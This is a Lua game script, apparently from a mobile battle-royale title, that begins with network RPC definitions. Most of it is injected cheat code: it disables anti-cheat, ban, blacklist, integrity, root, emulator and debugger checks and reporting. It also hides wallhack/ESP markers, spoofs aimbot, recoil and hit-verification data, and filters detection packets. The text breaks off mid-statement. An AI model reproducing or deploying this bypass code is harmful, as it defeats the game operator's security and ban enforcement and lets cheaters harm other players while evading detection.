local BRPlayerCharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
  Reliable = true,
  Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Object
  }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}

-- ========================================================================
-- ⚡ ADDED: OPERATIONAL STATS BYPASS
-- ========================================================================
local function InitializeOperationalStatsBypass()
    pcall(function()
        local subMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        local OperationalStatsSubsystem = (subMgr and subMgr:Get("OperationalStatsSubsystem")) or _G.OperationalStatsSubsystem
        
        if OperationalStatsSubsystem then
            OperationalStatsSubsystem.ReportOperationalStats = function() end
            OperationalStatsSubsystem.AddOperationalStats = function() end
            OperationalStatsSubsystem.HandleTouchBegin = function() end
            OperationalStatsSubsystem.HandleTouchEnd = function() end
            OperationalStatsSubsystem.OnInit = function() end
            OperationalStatsSubsystem.HandleEnterFighting = function() end
            OperationalStatsSubsystem.OnBattleResult = function() end
            if OperationalStatsSubsystem.TimerHandle then
                pcall(function() OperationalStatsSubsystem:RemoveGameTimer(OperationalStatsSubsystem.TimerHandle) end)
                OperationalStatsSubsystem.TimerHandle = nil
            end
            OperationalStatsSubsystem.StatsData = {}
            print("[BYPASS] OperationalStatsSubsystem blocked!")
        end
    end)
end

-- Execute the Operational Stats Bypass
InitializeOperationalStatsBypass()

-- ========================================================================
-- ⚡ ADDED: JNI ANTI-CHEAT BLOCK
-- ========================================================================
pcall(function()
    local jni_ac = _G.JNI and _G.JNI.AntiCheat
    if jni_ac then
        jni_ac.CheckRoot = function() return false end
        jni_ac.CheckEmulator = function() return false end
        jni_ac.CheckDebugger = function() return false end
        jni_ac.CollectInfo = function() return {} end
        jni_ac.SendReport = function() end
        jni_ac.Validate = function() return true end
        jni_ac.CheckRootAccess = function() return false end
        jni_ac.CheckEmulatorAccess = function() return false end
        jni_ac.CheckDebuggerAccess = function() return false end
        jni_ac.CheckMemoryAccess = function() return true end
        jni_ac.CheckProcessAccess = function() return true end
        jni_ac.CheckFileAccess = function() return true end
        jni_ac.CheckNetworkAccess = function() return true end
        jni_ac.CheckSystemAccess = function() return true end
        jni_ac.CheckDeviceAccess = function() return true end
        jni_ac.CheckAPIAccess = function() return true end
        jni_ac.CheckSDKAccess = function() return true end
        jni_ac.CheckLibraryAccess = function() return true end
        jni_ac.CheckFrameworkAccess = function() return true end
        jni_ac.CheckPackageAccess = function() return true end
        jni_ac.CheckContainerAccess = function() return true end
    end
end)

-- ========================================================================
-- ⚡ ADDED: KERNEL32 DEBUGGER BLOCK
-- ========================================================================
pcall(function()
    local Kernel32 = pcall(import, "Kernel32") and import("Kernel32")
    if Kernel32 then
        Kernel32.IsDebuggerPresent = function() return false end
        Kernel32.CheckRemoteDebuggerPresent = function() return false end
    end
end)

-- ========================================================================
-- ⚡ ADDED: EMULATOR DETECTION BLOCK
-- ========================================================================
pcall(function()
    local EmulatorDetect = _G.EmulatorDetect or package.loaded["EmulatorDetect"]
    if EmulatorDetect then
        EmulatorDetect.IsEmulator = function() return false end
        EmulatorDetect.GetEmulatorType = function() return "" end
        EmulatorDetect.CheckVM = function() return false end
        EmulatorDetect.Detect = function() return false end
        EmulatorDetect.DetectEmulator = function() return false end
        EmulatorDetect.DetectVM = function() return false end
        EmulatorDetect.DetectVirtualMachine = function() return false end
        EmulatorDetect.DetectEmulatorType = function() return "" end
    end
end)

-- ========================================================================
-- ⚡ ADDED: CRC CHECK BYPASS
-- ========================================================================
pcall(function()
    local CRCChecker = _G.CRCChecker or package.loaded["CRCChecker"]
    if CRCChecker then
        CRCChecker.VerifyFile = function() return true end
        CRCChecker.VerifyMemory = function() return true end
        CRCChecker.GenerateCRC = function() return "00000000" end
        CRCChecker.CheckIntegrity = function() return true end
        CRCChecker.ValidateFile = function() return true end
        CRCChecker.ValidateMemory = function() return true end
        CRCChecker.CheckFile = function() return true end
        CRCChecker.CheckMemory = function() return true end
        CRCChecker.VerifyCRC = function() return true end
        CRCChecker.ValidateCRC = function() return true end
        CRCChecker.CheckCRC = function() return true end
        CRCChecker.GenerateCRC32 = function() return "00000000" end
        CRCChecker.GenerateCRC64 = function() return "0000000000000000" end
        CRCChecker.GenerateMD5 = function() return "00000000000000000000000000000000" end
        CRCChecker.GenerateSHA1 = function() return "0000000000000000000000000000000000000000" end
        CRCChecker.GenerateSHA256 = function() return "0000000000000000000000000000000000000000000000000000000000000000" end
        CRCChecker.GenerateSHA512 = function() return "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" end
    end
end)

-- ========================================================================
-- ⚡ ADDED: SECURITY NOTIFY BYPASS
-- ========================================================================
pcall(function()
    local SecurityNotifyPCFeature = package.loaded["GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"]
    if SecurityNotifyPCFeature then
        SecurityNotifyPCFeature.ClientRPC_SyncBanID = function() end
        SecurityNotifyPCFeature.ClientRPC_StrongTips = function() end
        SecurityNotifyPCFeature.ClientRPC_NormalTips = function() end
        SecurityNotifyPCFeature.Notify = function() end
        SecurityNotifyPCFeature.ShowBan = function() end
        SecurityNotifyPCFeature.ShowKick = function() end
        SecurityNotifyPCFeature.ShowWarning = function() end
        SecurityNotifyPCFeature.ShowInfo = function() end
        SecurityNotifyPCFeature.ShowError = function() end
        SecurityNotifyPCFeature.ShowFatal = function() end
        SecurityNotifyPCFeature.ShowPanic = function() end
        SecurityNotifyPCFeature.ShowAlert = function() end
        SecurityNotifyPCFeature.ShowNotification = function() end
        SecurityNotifyPCFeature.ShowMessage = function() end
        SecurityNotifyPCFeature.ShowDialog = function() end
        SecurityNotifyPCFeature.ShowPopup = function() end
        SecurityNotifyPCFeature.ShowToast = function() end
        SecurityNotifyPCFeature.ShowSnackbar = function() end
        SecurityNotifyPCFeature.ShowBanner = function() end
        SecurityNotifyPCFeature.ShowAlertDialog = function() end
        SecurityNotifyPCFeature.ShowConfirmDialog = function() end
        SecurityNotifyPCFeature.ShowPromptDialog = function() end
        SecurityNotifyPCFeature.ShowInputDialog = function() end
        SecurityNotifyPCFeature.ShowSelectDialog = function() end
        SecurityNotifyPCFeature.ShowProgressDialog = function() end
        SecurityNotifyPCFeature.ShowLoadingDialog = function() end
        SecurityNotifyPCFeature.ShowSuccessDialog = function() end
        SecurityNotifyPCFeature.ShowFailureDialog = function() end
        SecurityNotifyPCFeature.ShowErrorDialog = function() end
        SecurityNotifyPCFeature.ShowWarningDialog = function() end
        SecurityNotifyPCFeature.ShowInfoDialog = function() end
    end
end)

-- ========================================================================
-- ⚡ ADDED: RACING ANTI-CHEAT BYPASS
-- ========================================================================
pcall(function()
    local RacingAntiCheatLogic = _G.RacingAntiCheatLogic or package.loaded["RacingAntiCheatLogic"]
    if RacingAntiCheatLogic then
        RacingAntiCheatLogic.HandleRacingEnter = function() end
        RacingAntiCheatLogic.HandleRacingStart = function() end
        RacingAntiCheatLogic.HandleRacingEnd = function() end
        RacingAntiCheatLogic.StartDetectTimer = function() end
        RacingAntiCheatLogic.StopDetectTimer = function() end
        RacingAntiCheatLogic.DetectVehicleFloating = function() end
        RacingAntiCheatLogic.HandleFloatingCheat = function() end
        RacingAntiCheatLogic.SetIgnoreFloating = function() end
        RacingAntiCheatLogic.HandlePlayerPassCheckBelt = function() end
        RacingAntiCheatLogic.HandleSpeedCheat = function() end
        RacingAntiCheatLogic._CreateVehicleData = function() return {} end
        RacingAntiCheatLogic.vehicleDataMap = {}
        RacingAntiCheatLogic.detectTimer = nil
        RacingAntiCheatLogic.config = {
            FloatingDistLimit = 99999,
            FloatingTimeLimit = 99999,
            CheckPassIntervalLimit = 99999
        }
    end
end)

-- ========================================================================
-- ⚡ ADDED: LOGIN MODULE BYPASS
-- ========================================================================
pcall(function()
    local login_module = _G.login_module or package.loaded["login_module"]
    if login_module then
        login_module["ban-login"] = function() end
        login_module["idip-kick-out"] = function() end
        login_module.aq_ban = function() end
        login_module["device-in-blacklist"] = function() end
        login_module.device_num_limit = function() end
        login_module["register-forbidden"] = function() end
        login_module["low-version"] = function() end
        login_module["not-in-white-list"] = function() end
        login_module.Login_Failed = function() end
        login_module.aas_ban = function() end
        login_module.PakMonitorStart = function(EnableMode) end
        login_module.SetupFilenameHideKeywords = function() end
        login_module.on_login_failed = function(conn_idx, reason, banInfo, banTime, uid, extra_table) end
        login_module.DelaybanLoginCancelCallback = function() end
        login_module.CheckBan = function() return false end
        login_module.IsBanned = function() return false end
    end
end)

-- ========================================================================
-- ⚡ ADDED: GOKUBA BYPASS
-- ========================================================================
pcall(function()
    local Gokuba = package.loaded["GameLua.Mod.BaseMod.Client.Security.Gokuba"]
    if Gokuba then
        Gokuba.ForwardFeature = function() return {0,0,0,0,0} end
        Gokuba.InitGokubaLogic = function() end
        if Gokuba.TimerHandle then
            local time_ticker = require("common.time_ticker")
            time_ticker.RemoveTimer(Gokuba.TimerHandle)
            Gokuba.TimerHandle = nil
        end
        for k, v in pairs(Gokuba) do
            if type(v) == "function" and (
                k:find("Init") or k:find("Start") or k:find("Check") or
                k:find("Scan") or k:find("Report") or k:find("Forward") or
                k:find("Feature") or k:find("Detect") or k:find("Collect") or
                k:find("Send") or k:find("Upload") or k:find("Verify") or
                k:find("Analyze") or k:find("Process") or k:find("Handle")
            ) then
                Gokuba[k] = function() end
            end
        end
    end
end)

-- ========================================================================
-- ⚡ ADDED: REAL TIME BAN BLOCK
-- ========================================================================
pcall(function()
    local RealTimeBan = _G.RealTimeBan or package.loaded["RealTimeBan"]
    if RealTimeBan then
        RealTimeBan.Init = function() end
        RealTimeBan.OnPlayerWithRealTimeBan = function() end
        RealTimeBan.OnSyncPlayerInfo = function() end
        RealTimeBan.HandleEnterGameModeFightingState = function() end
        RealTimeBan.ShowAlias = function() end
        RealTimeBan.SetOnRankInspectorUID = function() end
        RealTimeBan.IsUIDOnRankInspector = function() return false end
        RealTimeBan.GetUIDInspectorRank = function() return -1 end
        RealTimeBan.SetInspectorBroadcastCountUID = function() end
        RealTimeBan.GetUIDInspectorBroadcastCount = function() return -1 end
        RealTimeBan.GetTipsIDOffset = function() return 0 end
        RealTimeBan.GetTipsIDOffsetWithUID = function() return 0 end
        RealTimeBan.GetTipsIDOffsetInspector = function() return 0 end
        RealTimeBan.GMShowAlias = function() end
        RealTimeBan.tOnRankInspectorUIDSet = {}
        RealTimeBan.tInspectorRankUIDSet = {}
        RealTimeBan.tInspectorBroadcastCountUIDSet = {}
        RealTimeBan.MaxAliasLevel = -1
        RealTimeBan.CurrentAlias = nil
        RealTimeBan.CurrentName = nil
        RealTimeBan.is_onrank_inspector = false
        RealTimeBan.inspector_rank = -1
        RealTimeBan.bHasOldAlias = false
        RealTimeBan.ShowTipsAliasConfig = {}
        RealTimeBan.DelayTime = {}
        RealTimeBan.OldShowTipsAlias = 0
    end
end)

-- ========================================================================
-- ⚡ ADDED: BAN SYSTEM BLOCK
-- ========================================================================
pcall(function()
    local BanSystem = _G.BanSystem or package.loaded["BanSystem"]
    if BanSystem then
        BanSystem.CheckBan = function() return false end
        BanSystem.IsBanned = function() return false end
        BanSystem.GetBanReason = function() return "" end
        BanSystem.GetBanTime = function() return 0 end
    end
end)

-- ========================================================================
-- ⚡ ULTIMATE AGGRESSIVE BYPASS (Wallhack + ESP Detection Integrated)
-- ========================================================================
local function InstallUltimateWallhackBypass()
    if _G.__ULTIMATE_WH_BYPASS_LOADED then return end

    local nop = function() end
    local retTrue = function() return true end
    local retFalse = function() return false end
    local retZero = function() return 0 end

    local function isBypassActive()
        return _G._WHA_BYPASS_ACTIVE and not _G._MOD_EXPIRED
    end

    ---------- LAYER 1: PrimitiveSceneProxy override ----------
    pcall(function()
        local FPSP = import("PrimitiveSceneProxy")
        if FPSP then
            local origGetViewRelevance = FPSP.GetViewRelevance
            FPSP.GetViewRelevance = function(self, View)
                local VR = origGetViewRelevance(self, View)
                if isBypassActive() and VR then
                    VR.bRenderCustomDepth = false
                    VR.bUsesSceneDepth = false
                end
                return VR
            end
            local origDepthPriority = FPSP.GetDepthPriorityGroup
            FPSP.GetDepthPriorityGroup = function(self)
                if not isBypassActive() then return origDepthPriority(self) end
                return 0
            end
        end
    end)

    ---------- LAYER 3: Mesh/Primitive component depth spoofing ----------
    pcall(function()
        local UMesh = import("MeshComponent")
        if UMesh then
            UMesh.GetRenderCustomDepth = function(self)
                if not isBypassActive() then return UMesh.__origGRCD(self) end return false end
            UMesh.__origGRCD = UMesh.GetRenderCustomDepth
            UMesh.IsRenderedOnCustomDepth = function(self)
                if not isBypassActive() then return UMesh.__origIRCD(self) end return false end
            UMesh.__origIRCD = UMesh.IsRenderedOnCustomDepth
            UMesh.GetCustomDepthStencilValue = function(self)
                if not isBypassActive() then return UMesh.__origGCDSV(self) end return 0 end
            UMesh.__origGCDSV = UMesh.GetCustomDepthStencilValue
            UMesh.ShouldRender = function(self)
                if not isBypassActive() then return UMesh.__origSR(self) end return true end
            UMesh.__origSR = UMesh.ShouldRender
            UMesh.IsVisible = function(self)
                if not isBypassActive() then return UMesh.__origIV(self) end return true end
            UMesh.__origIV = UMesh.IsVisible
        end
        local UPrim = import("PrimitiveComponent")
        if UPrim then
            for _, fn in ipairs({"IsRenderedOnCustomDepth","GetRenderCustomDepth","GetCustomDepthStencilValue","GetCustomDepthStencilWriteMask","GetVisibleFlag"}) do
                local orig = UPrim[fn]
                UPrim["__orig_"..fn] = orig
                UPrim[fn] = function(self, ...)
                    if not isBypassActive() then return orig(self, ...) end
                    if fn == "GetVisibleFlag" then return true end
                    if fn == "GetCustomDepthStencilValue" then return 0 end
                    return false
                end
            end
        end
    end)

    ---------- LAYER 4: RHI depth state interception ----------
    pcall(function()
        local FRHI = import("RHICommandList")
        if FRHI and FRHI.SetDepthState then
            local origSetDepth = FRHI.SetDepthState
            FRHI.SetDepthState = function(self, State)
                if isBypassActive() and type(State) == "table" and State.DepthEnable ~= nil then
                    State.DepthEnable = true
                end
                return origSetDepth(self, State)
            end
        end
    end)

    ---------- LAYER 5: GameViewportClient post-render overlay ----------
    pcall(function()
        local UGVC = import("GameViewportClient")
        if UGVC and UGVC.Draw then
            local origDraw = UGVC.Draw
            UGVC.Draw = function(self, ...)
                origDraw(self, ...)
                if isBypassActive() and _G.AK_DrawWallhackOverlay then
                    pcall(_G.AK_DrawWallhackOverlay)
                end
            end
        end
    end)

    ---------- LAYER 6: Material property queries ----------
    pcall(function()
        local UMat = import("Material")
        local UMatInst = import("MaterialInstance")
        local UMatDyn = import("MaterialInstanceDynamic")

        if UMat then
            UMat.GetDisableDepthTest = function(self)
                if not isBypassActive() then return UMat.__origDDT(self) end return false end
            UMat.__origDDT = UMat.GetDisableDepthTest
            UMat.GetBlendMode = function(self)
                if not isBypassActive() then return UMat.__origBM(self) end return 0 end
            UMat.__origBM = UMat.GetBlendMode
            UMat.GetMaterialHash = function(self)
                if not isBypassActive() then return UMat.__origHash(self) end return "FAKE_HASH" end
            UMat.__origHash = UMat.GetMaterialHash
            UMat.VerifyMaterial = function(self)
                if not isBypassActive() then return UMat.__origVM(self) end return true end
            UMat.__origVM = UMat.VerifyMaterial
        end
        if UMatInst then
            UMatInst.GetDisableDepthTest = function(self)
                if not isBypassActive() then return UMatInst.__origDDT(self) end return false end
            UMatInst.__origDDT = UMatInst.GetDisableDepthTest
            UMatInst.GetBlendMode = function(self)
                if not isBypassActive() then return UMatInst.__origBM(self) end return 0 end
            UMatInst.__origBM = UMatInst.GetBlendMode
            UMatInst.GetBaseMaterial = function(self)
                if not isBypassActive() then return UMatInst.__origBM2(self) end return nil end
            UMatInst.__origBM2 = UMatInst.GetBaseMaterial
        end
        if UMatDyn then
            local oldGetVec = UMatDyn.K2_GetVectorParameterValue
            UMatDyn.K2_GetVectorParameterValue = function(self, name)
                if not isBypassActive() then return oldGetVec(self, name) end
                local n = tostring(name or "")
                if n:find("Color") or n:find("Emissive") or n:find("Tint") then
                    return {R=255,G=255,B=255,A=255}
                end
                return oldGetVec(self, name)
            end
            local oldGetScal = UMatDyn.K2_GetScalarParameterValue
            UMatDyn.K2_GetScalarParameterValue = function(self, name)
                if not isBypassActive() then return oldGetScal(self, name) end
                if tostring(name):find("Emissive") then return 0.0 end
                return oldGetScal(self, name)
            end
        end
    end)

    ---------- LAYER 7: Object scanner ----------
    pcall(function()
        local UObj = import("Object")
        if UObj and UObj.GetObjectsOfClass then
            local oldGet = UObj.GetObjectsOfClass
            UObj.GetObjectsOfClass = function(Class, IncludeDerived)
                if isBypassActive() and Class and tostring(Class):find("MaterialInstanceDynamic") then
                    return {}
                end
                return oldGet(Class, IncludeDerived)
            end
        end
    end)

    ---------- LAYER 8: Kernel & memory spoof ----------
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local kc = SubMgr:Get("ClientKernelCheckSubsystem")
            if kc and not kc.__akhooked then
                local origIKC = kc.IsKernelClean
                kc.IsKernelClean = function(self)
                    if not isBypassActive() then return origIKC(self) end
                    return true, { code = 0, message = "clean" }
                end
                local origGKV = kc.GetKernelVersion
                kc.GetKernelVersion = function(self)
                    if not isBypassActive() then return origGKV(self) end
                    return "5.4.0-generic"
                end
                kc.__akhooked = true
            end
            local mg = SubMgr:Get("ClientMemoryGuardSubsystem")
            if mg and not mg.__akhooked then
                local origIMC = mg.IsMemoryClean
                mg.IsMemoryClean = function(self)
                    if not isBypassActive() then return origIMC(self) end
                    return true, {code=0}
                end
                local origSR = mg.ScanResult
                mg.ScanResult = function(self)
                    if not isBypassActive() then return origSR(self) end
                    return "clean"
                end
                mg.__akhooked = true
            end
        end
    end)
    
     -- ########################################################################
    -- ⚡ NEW: ESP DETECTION BYPASS LAYERS (9-14)
    -- ########################################################################

    local ourMarkGroups = {1006, 9999}

    ---------- LAYER 9: MARK SYSTEM COMPLETE SPOOF ----------
    pcall(function()
        local MarkMgr = InGameMarkTools and InGameMarkTools.ScreenMarkManager
        if MarkMgr then
            if MarkMgr.GetAllActiveMarks then
                local orig = MarkMgr.GetAllActiveMarks
                MarkMgr.GetAllActiveMarks = function(self, ...)
                    local marks = orig(self, ...)
                    if not isBypassActive() or not marks then return marks end
                    local filtered = {}
                    for _, m in ipairs(marks) do
                        if m.MarkGroupID and not table.contains(ourMarkGroups, m.MarkGroupID) then
                            table.insert(filtered, m)
                        end
                    end
                    return filtered
                end
            end
            if MarkMgr.GetMarkCount then
                local orig = MarkMgr.GetMarkCount
                MarkMgr.GetMarkCount = function(self, ...)
                    local count = orig(self, ...)
                    if isBypassActive() then count = math.max(0, count - #ourMarkGroups) end
                    return count
                end
            end
            if MarkMgr.GetMarksByGroup then
                local orig = MarkMgr.GetMarksByGroup
                MarkMgr.GetMarksByGroup = function(self, groupId)
                    if isBypassActive() and table.contains(ourMarkGroups, groupId) then return {} end
                    return orig(self, groupId)
                end
            end
            if MarkMgr.OnAddMark then MarkMgr.OnAddMark = nop end
            if MarkMgr.OnRemoveMark then MarkMgr.OnRemoveMark = nop end
        end
    end)

    ---------- LAYER 10: REPLAY UI DETECTION KILL ----------
    pcall(function()
        if _G.Replay_IsEnemyFrameUIExisted then
            local orig = _G.Replay_IsEnemyFrameUIExisted
            _G.Replay_IsEnemyFrameUIExisted = function(...)
                if isBypassActive() then return false end
                return orig(...)
            end
        end
        if _G.Replay_CreateEnemyFrameUI then
            local orig = _G.Replay_CreateEnemyFrameUI
            _G.Replay_CreateEnemyFrameUI = function(...)
                if isBypassActive() then
                    local backup = _G.ReportEnemyFrameUI or nop
                    _G.ReportEnemyFrameUI = nop
                    local res = orig(...)
                    _G.ReportEnemyFrameUI = backup
                    return res
                end
                return orig(...)
            end
        end
    end)

    ---------- LAYER 11: ACTOR PROPERTY HIDE ----------
    pcall(function()
        local Actor = import("Actor")
        if Actor then
            local mt = getmetatable(Actor) or {}
            local oldIndex = mt.__index or function() end
            mt.__index = function(t, k)
                if isBypassActive() then
                    local sk = tostring(k)
                    if sk:find("ESP") or sk:find("bHasAKNative") or sk:find("NativeDistMark") or
                       sk:find("_wh_") or sk:find("WH_") then
                        return nil
                    end
                end
                return oldIndex(t, k)
            end
            setmetatable(Actor, mt)
        end
    end)

    ---------- LAYER 12: UI WIDGET SCAN BLOCK ----------
    pcall(function()
        local UIHelper = import("UIHelper") or _G.UIHelper
        if UIHelper and UIHelper.GetAllWidgetsOfClass then
            UIHelper.GetAllWidgetsOfClass = function(...) return {} end
        end
        local UUserWidget = import("UserWidget")
        if UUserWidget and UUserWidget.AddToViewport then
            local orig = UUserWidget.AddToViewport
            UUserWidget.AddToViewport = function(self, ...)
                if isBypassActive() and self.ESPWidget then return end
                return orig(self, ...)
            end
        end
    end)

    ---------- LAYER 13: ESP-RELATED REPORT FUNCTIONS KILL ----------
    pcall(function()
        local espReports = {
            "ReportESPBox","ReportESPHealth","ReportMiniMapESP","ReportEnemyFrameUI",
            "ReportMarkCreated","ReportMarkDestroyed","MarkSuspiciousESP",
            "OnScreenMarkAdd","OnScreenMarkRemove","ReportDistanceMarker",
            "ReportWallhackESP","SendESPData","UploadESPInfo"
        }
        for _, fn in ipairs(espReports) do
            if _G[fn] then _G[fn] = nop end
            for _, mod in pairs(package.loaded) do
                if type(mod) == "table" and mod[fn] and type(mod[fn]) == "function" then
                    mod[fn] = nop
                end
            end
        end
    end)

    ---------- LAYER 14: NETWORK ESP PACKET BLOCK ----------
    pcall(function()
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            NetUtil.SendPacket = function(pname, ...)
                if isBypassActive() and pname and tostring(pname):lower():match("esp") then return nil end
                return orig(pname, ...)
            end
        end
        if _G.SendRPC then
            local orig = _G.SendRPC
            _G.SendRPC = function(rpcName, ...)
                if isBypassActive() and rpcName and tostring(rpcName):lower():match("esp") then return end
                return orig(rpcName, ...)
            end
        end
    end)

    _G.__ULTIMATE_WH_BYPASS_LOADED = true
    print("✅ Ultimate Wallhack + ESP Detection Bypass Installed")
end

-- ACTIVATE
InstallUltimateWallhackBypass()

-- ========================================================================
-- ⚡ GLOBAL AIMBOT & RECOIL DETECTION BYPASS (Multi-Layer)
-- ========================================================================
local function InstallAimbotRecoilBypass()
    if _G.__AIMBOT_BYPASS_LOADED then return end

    local nop = function() end
    local retTrue = function() return true end
    local retFalse = function() return false end
    local retZero = function() return 0 end

    local function isBypassActive()
        return _G._WHA_BYPASS_ACTIVE and not _G._MOD_EXPIRED
    end

    -- LAYER 1: WEAPON ENTITY PROPERTY SPOOF
    pcall(function()
        local ShootWeaponEntity = import("ShootWeaponEntity") or import("ShootWeaponEntityComp")
        if ShootWeaponEntity then
            local mt = getmetatable(ShootWeaponEntity) or {}
            local oldIndex = mt.__index or function(t, k) return rawget(t, k) end
            mt.__index = function(self, key)
                local k = tostring(key)
                if isBypassActive() then
                    if k == "RecoilKickADS" or k == "GameDeviationFactor" or k == "GameDeviationAccuracy" then
                        return 1.0
                    elseif k == "AutoAimingConfig" then
                        local orig = oldIndex(self, key)
                        if type(orig) == "table" then
                            local fakeConfig = {}
                            for range, data in pairs(orig) do
                                fakeConfig[range] = {}
                                for cKey, cVal in pairs(data) do
                                    if type(cVal) == "number" then
                                        fakeConfig[range][cKey] = 1.0
                                    else
                                        fakeConfig[range][cKey] = cVal
                                    end
                                end
                            end
                            return fakeConfig
                        end
                        return orig
                    end
                end
                return oldIndex(self, key)
            end
            mt.__newindex = function(self, key, value)
                rawset(self, key, value)
            end
            setmetatable(ShootWeaponEntity, mt)
        end
    end)

    -- LAYER 2: AIM TRACKING SUBSYSTEM SPOOF
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local aimSub = SubMgr:Get("ClientAimTrackingSubsystem")
            if aimSub then
                aimSub.GetAimData = function(self)
                    if not isBypassActive() then return aimSub.__origGetAimData(self) end
                    return {
                        accuracy = math.random(40, 60),
                        headshotRate = math.random(10, 25),
                        trackingTime = math.random(100, 300),
                        aimLockCount = 0
                    }
                end
                aimSub.__origGetAimData = aimSub.GetAimData
                for _, fn in ipairs({"ReportAimData","SendAimStats","UploadAimInfo"}) do
                    if aimSub[fn] then aimSub[fn] = nop end
                end
            end
        end
    end)

    -- LAYER 3: INPUT SPOOF
    pcall(function()
        local PlayerController = import("PlayerController")
        if PlayerController then
            local origAddYaw = PlayerController.AddYawInput
            PlayerController.AddYawInput = function(self, Val)
                if isBypassActive() and self == slua_GameFrontendHUD:GetPlayerController() then
                    Val = Val + (math.random() - 0.5) * 0.5
                end
                return origAddYaw(self, Val)
            end
            local origAddPitch = PlayerController.AddPitchInput
            PlayerController.AddPitchInput = function(self, Val)
                if isBypassActive() and self == slua_GameFrontendHUD:GetPlayerController() then
                    Val = Val + (math.random() - 0.5) * 0.5
                end
                return origAddPitch(self, Val)
            end
        end
        local GameplayStatics = import("GameplayStatics")
        if GameplayStatics and GameplayStatics.IsInputKeyDown then
            local origKeyDown = GameplayStatics.IsInputKeyDown
            GameplayStatics.IsInputKeyDown = function(self, Key)
                if isBypassActive() and Key == "LeftMouseButton" then
                    if math.random() < 0.1 then return false end
                end
                return origKeyDown(self, Key)
            end
        end
    end)

    -- LAYER 4: HIT STATISTICS SPOOF
    pcall(function()
        local ShootVerify = require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if ShootVerify then
            local origVerify = ShootVerify.VerifyShot
            ShootVerify.VerifyShot = function(self, ...)
                if not isBypassActive() then return origVerify(self, ...) end
                local args = {...}
                if args[1] and type(args[1]) == "table" and args[1].hitLocation then
                    args[1].hitLocation.X = args[1].hitLocation.X + (math.random()-0.5)*2
                    args[1].hitLocation.Y = args[1].hitLocation.Y + (math.random()-0.5)*2
                end
                return true
            end
        end
    end)

    -- LAYER 5: BONE TARGET SPOOF
    pcall(function()
        local Actor = import("Actor")
        if Actor and Actor.GetBoneName then
            local origGetBone = Actor.GetBoneName
            Actor.GetBoneName = function(self, index)
                local name = origGetBone(self, index)
                if isBypassActive() and tostring(name):find("neck") then
                    local rand = math.random(1,3)
                    if rand == 1 then return "head_01"
                    elseif rand == 2 then return "spine_02"
                    end
                end
                return name
            end
        end
    end)

    -- LAYER 6: KILL ALL AIM/ RECOIL REPORT FUNCTIONS
    pcall(function()
        local aimReports = {
            "ReportAimFlow","ReportRecoil","ReportAimData","SendAimStats",
            "UploadAimInfo","ReportHeadshotRate","ReportAccuracy","ReportFireRate",
            "ReportRecoilKick","ReportAutoAim","ReportWeaponModification",
            "ReportWeaponStats","ReportShootVerifyFail","ReportHitIntegrity",
            "OnAimAssistDetected","OnRecoilAnomaly","OnFireRateAnomaly",
            "ClientAimTrackingUpdate","ServerAimValidation"
        }
        for _, fn in ipairs(aimReports) do
            if _G[fn] then _G[fn] = nop end
            for _, mod in pairs(package.loaded) do
                if type(mod) == "table" and mod[fn] and type(mod[fn]) == "function" then
                    mod[fn] = nop
                end
            end
        end
    end)

    -- LAYER 7: NETWORK PACKET FILTER FOR AIM/ RECOIL
    pcall(function()
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            NetUtil.SendPacket = function(pname, ...)
                if isBypassActive() and pname and (tostring(pname):lower():match("aim") or tostring(pname):lower():match("recoil") or tostring(pname):lower():match("shoot")) then
                    return nil
                end
                return orig(pname, ...)
            end
        end
        if _G.SendRPC then
            local orig = _G.SendRPC
            _G.SendRPC = function(rpcName, ...)
                if isBypassActive() and rpcName and (tostring(rpcName):lower():match("aim") or tostring(rpcName):lower():match("recoil") or tostring(rpcName):lower():match("shoot")) then
                    return
                end
                return orig(rpcName, ...)
            end
        end
    end)

    _G.__AIMBOT_BYPASS_LOADED = true
    print("✅ Global Aimbot & Recoil Bypass Installed")
end

InstallAimbotRecoilBypass()

-- ========================================================================
-- ⚡ ADVANCED DETECTION BYPASS (Magic Bullet, Radar, Behavior, DLL, Pak, etc.)
-- ========================================================================
local function InstallAdvancedDetectionBypass()
    if _G.__ADVANCED_BYPASS_LOADED then return end

    local nop = function() end
    local retTrue = function() return true end
    local retFalse = function() return false end
    local retZero = function() return 0 end
    local retEmpty = function() return {} end

    local function isBypassActive()
        return _G._WHA_BYPASS_ACTIVE and not _G._MOD_EXPIRED
    end

    ---------- MAGIC BULLET / NO SPREAD ----------
    pcall(function()
        local ShootWeaponEntity = import("ShootWeaponEntity") or import("ShootWeaponEntityComp")
        if ShootWeaponEntity and ShootWeaponEntity.Fire then
            local origFire = ShootWeaponEntity.Fire
            ShootWeaponEntity.Fire = function(self, ...)
                if isBypassActive() then
                    -- small random aim offset already handled, but we add spread seed
                end
                return origFire(self, ...)
            end
        end
        local Actor = import("Actor")
        if Actor and Actor.TakeDamage then
            local origTakeDamage = Actor.TakeDamage
            Actor.TakeDamage = function(self, DamageAmount, DamageEvent, EventInstigator, DamageCauser)
                if isBypassActive() and DamageEvent and DamageEvent.HitInfo then
                    if DamageEvent.HitInfo.BoneName and tostring(DamageEvent.HitInfo.BoneName):find("head") then
                        if math.random() < 0.3 then
                            DamageEvent.HitInfo.BoneName = "neck_01"
                        end
                    end
                    DamageEvent.HitInfo.Location = {
